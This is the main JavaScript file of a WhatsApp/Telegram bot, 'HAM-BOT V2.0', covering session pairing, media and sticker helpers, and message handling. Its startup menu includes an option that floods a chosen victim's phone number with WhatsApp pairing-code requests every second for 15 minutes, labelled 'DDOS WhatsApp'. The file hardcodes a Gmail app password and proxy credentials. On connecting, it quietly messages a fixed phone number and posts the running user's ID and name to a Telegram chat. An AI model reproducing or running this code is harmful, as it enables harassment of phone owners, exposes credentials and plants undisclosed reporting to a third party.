require('./setting')
const startCleanSession = require('./SanzAll/SanzLibrary/cleaner');
startCleanSession();
const Setting = require('./setting')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessage, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, areJidsSameUser, getAggregateVotesInPollMessage, proto, delay } = require("@whiskeysockets/baileys")
const fs = require('fs')
const pino = require('pino')
const chalk = require('chalk')
const path = require('path')
const axios = require('axios')
const os = require('os')
const FileType = require('file-type')
const readline = require("readline");
const yargs = require('yargs/yargs')
const { HttpsProxyAgent } = require("https-proxy-agent");
const nodemailer = require('nodemailer')
const { Telegraf, Context } = require('telegraf')
const colors = require('@colors/colors/safe')
const { color } = require('./SanzAll/SanzLibrary/color');
const { say } = require('cfonts')
const agent = new HttpsProxyAgent("http://proxy:clph123@103.123.63.106:3128");
const _ = require('lodash')
const { Boom } = require('@hapi/boom')
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, imageToWebp3, videoToWebp, writeExifImg, writeExifImgAV, writeExifVid } = require('./SanzAll/SanzLibrary/exif')
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetchJson, await, sleep} = require('./SanzAll/SanzLibrary/myfunction')
const usePairingCode = true
const question = (text) => {
  const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
  });
  return new Promise((resolve) => {
rl.question(text, resolve)
  })
};
//————————————————————————//
var low
try {
low = require('lowdb')
} catch (e) {
low = require('./SanzAll/SanzLibrary/lowdb')}
//————————————————————————//
const { Low, JSONFile } = low
const mongoDB = require('./SanzAll/SanzLibrary/mongoDB')
//————————————————————————//
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
//————————————————————————//
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
global.db = new Low(
/https?:\/\//.test(opts['db'] || '') ?
new cloudDBAdapter(opts['db']) : /mongodb/.test(opts['db']) ?
new mongoDB(opts['db']) :
new JSONFile(`./SanzAll/SanzDatabase/database.json`)
)
global.DATABASE = global.db // Backwards Compatibility
global.loadDatabase = async function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }, 1 * 1000))
if (global.db.data !== null) return
global.db.READ = true
await global.db.read()
global.db.READ = false
global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
...(global.db.data || {})}
  global.db.chain = _.chain(global.db.data)}
loadDatabase()
//————————————————————————//
// FUNC SEND PAIR MAIL
async function sendEmail(to, subject, htmlContent) {
    let transporter = nodemailer.createTransport({
        service: 'Gmail',
        auth: {
            user: global.pairing.email,
            pass: global.pairing.password
        }
    });

    let mailOptions = {
        from: `"SanzMD" <${global.pairing.email}>`,
        to: to,
        subject: subject,
        html: htmlContent
    };

    return transporter.sendMail(mailOptions);
}

// CREATE TMP FILE
    function createTmpFolder() {
        const folderName = "temp";
        const folderPath = path.join(__dirname, folderName);
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath);
            console.log(chalk.green.bold(`[ Success ] Folder '${folderName}' berhasil dibuat.`));
        }
    }
    createTmpFolder();
    
//STARTING PAIRING CODE 
async function NovaWhatsapp() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const { state, saveCreds } = await useMultiFileAuthState(`HAM-SESSION`)
const nova = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !global.usePairingCode,
auth: state,
browser: ["Ubuntu", "Chrome", "20.0.04"],
});

  if (global.usePairingCode && !nova.authState.creds.registered) {
          await clearConsole();
      say(`HAM-BOT V2.0`, {
         font: 'block',
         align: 'center',
         gradient: ['blue', 'white']
    })
    const choice = await question('Pilih metode verifikasi:\n1. Via Gmail\n2. Via Nomor WhatsApp\n3. Spam Request Kode Pairing\nPilihan Anda: ');

  if (choice === '1') {
    const email = await question('Masukkan Alamat Email Anda:\n');
    await requestPairingAndSendEmail(email);
  } else if (choice === '2') {
    console.log(`Is connecting Number ${global.pairing}\n`);
    const code = await nova.requestPairingCode(global.pairing);
    console.log('Process...');
    await sleep(3000); // Tunggu selama 3000 milidetik
    console.log(`Your Pairing Code: ${code}`);
  } else if (choice === '3') {
    await spamPairingRequest();
  } else {
    console.log('Pilihan tidak valid.');
  }
}
async function requestPairingAndSendEmail(email) {
  try {
    await new Promise((resolve) => setTimeout(resolve, Setting.pairing_wait));
    const code = await nova.requestPairingCode(global.nomorbot);
    
    async function sendVerificationEmail(email, code) {
      try {
        const transporter = nodemailer.createTransport({
          service: 'gmail',
          host: 'smtp.gmail.com',
          port: 587,
          secure: false,
          auth: {
            user: 'rio28mei',  // Use environment variables
            pass: 'mktxfpdexwscxqbg',  // Use environment variables
          },
        });

        const mailOptions = {
          from: global.email,
          to: email,
          subject: global.subject,
          html: `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Request Pairing Code</title>
</head>
<body>
  <div style="border: 1px solid #ccc; padding: 20px; font-family: monospace;">
    <div style="background-color: rgba(255, 255, 255, 0.7); padding: 20px; border-radius: 10px">
       <h2 style="color: #00000">Request Pairing Code</h2>
                  <p>Dear ${email},</p>
        <p>Thank you for using this WhatsApp bot. here is your pairing code:</p>
        <div style="background-color: #e5e5e5; padding: 10px; text-align: center; font-size: 18px; font-weight: bold">
        <div style="text-align: center; font-family: monospace;">
        <div style="background-color: #e5e5e5; padding: 10px; text-align: center; font-size: 18px; font-weight: bold">
             ${code}
                  </div>
          <hr style="display: inline-block; margin-top: 20px; margin-bottom: 20px; width: 60%;">
          <p style="font-size: 12px; display: inline-block;"> Notification Request Pairing'Code, Harap Masukkan Kode Pairing Untuk Dapat Terhubung Di Bot WhatsApp</p>
          <p style="font-size: 12px; display: inline-block;"> Time Limit for Request Pairing Code : 30 seconds !!!</p>
        </div>
      </div>
</body>
</html>`,
        };

        await transporter.sendMail(mailOptions);
        console.log('Silahkan periksa Gmail Anda.');
      } catch (error) {
        console.error('Terjadi kesalahan saat mengirim email:', error);
      }
    }

    await sendVerificationEmail(email, code);
  } catch (error) {
    console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
  }
}

async function requestPairingAndSendWhatsApp(phoneNumber) {
  try {
    await new Promise((resolve) => setTimeout(resolve, Setting.pairing_wait));
    const code = await nova.requestPairingCode(global.nomorbot);

    // Anda bisa menambahkan kode untuk mengirim pesan WhatsApp jika diperlukan di sini

    console.log(`Your Pairing Code: ${code}`);
  } catch (error) {
    console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
  }
}

async function spamPairingRequest() {
  const startTime = Date.now();
  const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
  const phoneNumber = await question('Masukkan Nomor WhatsApp Target:\n');

  // Sanitasi nomor telepon
  const sanitizedPhoneNumber = phoneNumber.replace(/[^0-9]/g, '');

  while (Date.now() - startTime < duration) {
    let attempts = 100; // Jumlah percobaan per iterasi
    while (attempts > 0) {
      try {
        const pairingCodeResponse = await nova.requestPairingCode(sanitizedPhoneNumber);
        console.log(`Spam On Target: ${pairingCodeResponse}`);
      } catch (error) {
        console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
      }

      console.log(`DDOS WhatsApp: ${attempts} detik...`);
      await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
      attempts--;
    }

    console.log('Mengirim Ulang Dalam 30 detik...');
    await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
  }

  console.log('Selesai. 15 menit telah berlalu.');
}

async function clearConsole() {
    const isWindows = process.platform === 'win32';
    const isLinuxOrMac = process.platform === 'linux' || process.platform === 'darwin';

    return new Promise((resolve, reject) => {
        const command = isWindows ? 'cls' : (isLinuxOrMac ? 'clear' : '');
        if (command) {
            require('child_process').exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(error);
                    reject(error);
                } else {
                    console.log(stdout);
                    resolve();
                }
            });
        } else {
            console.log('Platform not supported for clearing console.');
            resolve();
        }
    });
}

      say(`HAM-BOT V2.0`, {
         font: 'block',
         align: 'center',
         gradient: ['blue', 'white']
    })
      console.table({
      "Model": "HAM-BOT V2.0 〽️",
      "Hostname": `${os.hostname}`,
      "Uptime": `${os.uptime}`,
      "Arch": `${os.machine}`
     })
//————————————————————————//
//UNTUK TOKEN BOT BUAT RUN 
const bot = new Telegraf(TOKEN)

    bot.on('message', async (client) => {
        require("./SanzAll/SanzTele/tele")(client, bot)

    })
bot.launch({
        dropPendingUpdates: true
    })

    bot.telegram.getMe().then((getme) => {
        console.table({
            "Creator": "HamsOffc",
            "Bot Name": getme.first_name,
            "Username": "@" + getme.username,
            "ID": getme.id,
            "Link": `https://t.me/${getme.username}`,
            "Author": "https://t.me/hamsoffc"
          })
    })

const sendTelegramNotification = async (message) => {
    try {
        await axios.post(`https://api.telegram.org/bot${global.TOKEN}/sendMessage`, {
            chat_id: chatId,
            text: message
        });
    } catch (error) {
    }
};
/*Comming Soon Prototype
const { IgApiClient } = require('instagram-private-api');
const ig = new IgApiClient();

ig.login('your_username', 'your_password')
  .then(() => {
    console.log('Login berhasil!');

    // Tampilkan menu
    console.log('Menu:');
    console.log('1. Follow user');
    console.log('2. Like post');
    console.log('3. Comment on post');
    console.log('4. Keluar');

    // Tunggu input dari pengguna
    const readline = require('readline');
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    rl.question('Pilih menu: ', (answer) => {
      switch (answer) {
        case '1':
          // Follow user
          const username = 'username';
          ig.user.followByUsername(username)
            .then(() => {
              console.log(`Followed ${username} successfully!`);
            })
            .catch((err) => {
              console.error(`Error following ${username}:`, err);
            });
          break;
        case '2':
          // Like post
          const mediaId = 'media_id';
          ig.media.like(mediaId)
            .then(() => {
              console.log(`Liked post ${mediaId} successfully!`);
            })
            .catch((err) => {
              console.error(`Error liking post ${mediaId}:`, err);
            });
          break;
        case '3':
          // Comment on post
          const mediaIdComment = 'media_id';
          const comment = 'your_comment';
          ig.media.comment(mediaIdComment, comment)
            .then(() => {
              console.log(`Commented on post ${mediaIdComment} successfully!`);
            })
            .catch((err) => {
              console.error(`Error commenting on post ${mediaIdComment}:`, err);
            });
          break;
        case '4':
          // Keluar
          console.log('Keluar dari bot!');
          process.exit();
          break;
        default:
          console.log('Menu tidak valid!');
      }

      // Tunggu input dari pengguna lagi
      rl.question('Pilih menu: ', (answer) => {
        // Ulangi proses di atas
      });
    });
  })
  .catch((err) => {
    console.error('Error logging in:', err);
  });*/
//————————————————————————//
nova.public = true
nova.ev.on('creds.update', saveCreds)
//————————————————————————//
nova.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

nova.ev.on('messages.upsert', async chatUpdate => {
try {
mek = chatUpdate.messages[0]
if (!mek.message) return
mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
if (mek.key && mek.key.remoteJid === 'status@broadcast') return
if (!nova.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
m = smsg(nova, mek, store)
require("./nova")(nova, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})

nova.ev.on('call', async (celled) => {
let botNumber = await nova.decodeJid(nova.user.id)
let koloi = global.anticall
if (!koloi) return
console.log(celled)
for (let kopel of celled) {
if (kopel.isGroup == false) {
if (kopel.status == "offer") {
let nomer = await nova.sendTextWithMentions(kopel.from, `*${nova.user.name}* tidak bisa menerima panggilan ${kopel.isVideo ? `video` : `suara`}. Maaf @${kopel.from.split('@')[0]} kamu akan diblokir. Silahkan hubungi Owner membuka blok !`)
nova.sendContact(kopel.from, owner.map( i => i.split("@")[0]), nomer)
await sleep(8000)
await nova.updateBlockStatus(kopel.from, "block")
}
}
}
})

nova.ev.on('contacts.update', update => {
for (let contact of update) {
let id = nova.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }}})

nova.getName = (jid, withoutContact  = false) => {
id = nova.decodeJid(jid)
withoutContact = nova.withoutContact || withoutContact 
let v
if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
v = store.contacts[id] || {}
if (!(v.name || v.subject)) v = nova.groupMetadata(id) || {}
resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
})
else v = id === '0@s.whatsapp.net' ? {
id,
name: 'WhatsApp'
} : id === nova.decodeJid(nova.user.id) ?
nova.user :
(store.contacts[id] || {})
return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')}

nova.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await nova.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await nova.getName(i + '@s.whatsapp.net')}\nFN:${await nova.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:aplusscell@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://chat.whatsapp.com/HbCl8qf3KQK1MEp3ZBBpSf\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`})}
nova.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts }, { quoted })}

 nova.downloadMediaMessage = async (message) => {
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(message, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
return buffer} 

 nova.sendImage = async (jid, path, caption = '', quoted = '', options) => {
let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
return await nova.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })}

nova.sendText = (jid, text, quoted = '', options) => nova.sendMessage(jid, { text: text, ...options }, { quoted })

nova.sendTextWithMentions = async (jid, text, quoted, options = {}) => nova.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

nova.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp(buff)}
await nova.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}

nova.sendImageAsStickerAV = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImgAV(buff, options)
} else {
buffer = await imageToWebp2(buff)}
await nova.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}

nova.sendImageAsStickerAvatar = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifImg(buff, options)
} else {
buffer = await imageToWebp3(buff)}
await nova.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}

nova.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
let buffer
if (options && (options.packname || options.author)) {
buffer = await writeExifVid(buff, options)
} else {
buffer = await videoToWebp(buff)}
await nova.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
return buffer}

 nova.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
let quoted = message.msg ? message.msg : message
let mime = (message.msg || message).mimetype || ''
let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
const stream = await downloadContentFromMessage(quoted, messageType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])}
let type = await FileType.fromBuffer(buffer)
trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
// save to file
await fs.writeFileSync(trueFileName, buffer)
return trueFileName}

 nova.cMod = (jid, copy, text = '', sender = nova.user.id, options = {}) => {
//let copy = message.toJSON()
let mtype = Object.keys(copy.message)[0]
let isEphemeral = mtype === 'ephemeralMessage'
if (isEphemeral) {
mtype = Object.keys(copy.message.ephemeralMessage.message)[0]}
let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
let content = msg[mtype]
if (typeof content === 'string') msg[mtype] = text || content
else if (content.caption) content.caption = text || content.caption
else if (content.text) content.text = text || content.text
if (typeof content !== 'string') msg[mtype] = {
...content,
...options}
if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
copy.key.remoteJid = jid
copy.key.fromMe = sender === nova.user.id
return proto.WebMessageInfo.fromObject(copy)}
nova.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
let types = await nova.getFile(PATH, true)
let { filename, size, ext, mime, data } = types
let type = '', mimetype = mime, pathFile = filename
if (options.asDocument) type = 'document'
if (options.asSticker || /webp/.test(mime)) {
let { writeExif } = require('./SanzAll/SanzLibrary/exif.js')
let media = { mimetype: mime, data }
pathFile = await writeExif(media, { packname: global.packname, author: global.packname2, categories: options.categories ? options.categories : [] })
await fs.promises.unlink(filename)
type = 'sticker'
mimetype = 'image/webp'}
else if (/image/.test(mime)) type = 'image'
else if (/video/.test(mime)) type = 'video'
else if (/audio/.test(mime)) type = 'audio'
else type = 'document'
await nova.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...options }, { quoted, ...options })
return fs.promises.unlink(pathFile)}
nova.parseMention = async(text) => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}

nova.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readViewOnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message}}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo}} : {})} : {})
await nova.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage}

nova.sendReact = async (jid, emoticon, keys = {}) => {
let reactionMessage = {
react: {
text: emoticon,
key: keys
}
}
return await nova.sendMessage(jid, reactionMessage)
}

nova.appendTextMessage = async (m, text, chatUpdate) => {
    let messages = await generateWAMessage(
      m.chat,
      {
        text: text,
        mentions: m.mentionedJid,
      },
      {
        userJid: nova.user.id,
        quoted: m.quoted && m.quoted.fakeObj,
      },
    );
    messages.key.fromMe = areJidsSameUser(m.sender, nova.user.id);
    messages.key.id = m.key.id;
    messages.pushName = m.pushName;
    if (m.isGroup) messages.participant = m.sender;
    let msg = {
      ...chatUpdate,
      messages: [proto.WebMessageInfo.fromObject(messages)],
      type: "append",
    };
    nova.ev.emit("messages.upsert", msg);
    return m;
  };
//————————————————————————//
nova.getFile = async (PATH, save) => {
let res
let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
//if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
let type = await FileType.fromBuffer(data) || {
mime: 'application/octet-stream',
ext: '.bin'
}
filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext)
if (data && save) fs.promises.writeFile(filename, data)
return {
res,
filename,
	size: await getSizeMedia(data),
...type,
data
}
}
nova.serializeM = (m) => smsg(nova, m, store)
nova.ev.on("connection.update", async (update) => {
const { connection, lastDisconnect } = update;
if (connection === "close") {
  let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
  if (reason === DisconnectReason.badSession) {
console.log(`Bad Session File, Please Delete Session and Scan Again`);
process.exit();
  } else if (reason === DisconnectReason.connectionClosed) {
console.log("Connection closed, reconnecting....");
NovaWhatsapp();
  } else if (reason === DisconnectReason.connectionLost) {
console.log("Connection Lost from Server, reconnecting...");
NovaWhatsapp();
  } else if (reason === DisconnectReason.connectionReplaced) {
console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
process.exit();
  } else if (reason === DisconnectReason.loggedOut) {
console.log(`Device Logged Out, Please Delete Folder Session yusril and Scan Again.`);
process.exit();
  } else if (reason === DisconnectReason.restartRequired) {
console.log("Restart Required, Restarting...");
NovaWhatsapp();
  } else if (reason === DisconnectReason.timedOut) {
console.log("Connection TimedOut, Reconnecting...");
NovaWhatsapp();
  } else {
console.log(`Unknown DisconnectReason: ${reason}|${connection}`);
NovaWhatsapp();
  }
} else if (connection === "open") {
  nova.sendMessage('6285781549773' + "@s.whatsapp.net", { text: `\`LOGIN SUCCESFUL\`\n\n*Ham-Bot V2.0*` });
  sendTelegramNotification(`Bot Berhasil Terhubung, Ini Infor Usernya\n\n—User ID : ${nova.user.id}\n—Name : ${nova.user.name}\n\n Ham-Bot`)
}
});
return nova
};

NovaWhatsapp()
//————————————————————————//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Succes Update : '${__filename}'`))
	delete require.cache[file]
	require(file)
})